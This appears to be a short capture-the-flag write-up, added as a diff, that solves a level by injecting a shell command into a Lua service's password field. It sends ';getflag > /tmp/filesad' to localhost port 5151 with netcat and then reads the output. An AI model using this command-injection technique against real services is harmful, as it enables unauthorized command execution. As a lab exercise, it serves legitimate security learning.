@@ -1,0 +1,11 @@
+the lua script has a hash that despite being 30 minutes finding that is NotSoEasy is not the password -_-'''
+
+from the other side as it is executing the ...pass... variable on hash function we can inject getflag like this 
+
+netcat localhost 5151 < a
+
+where a is a file containing:
+
+;getflag > /tmp/filesad
+
+and then you only need to cat /tmp/filesad
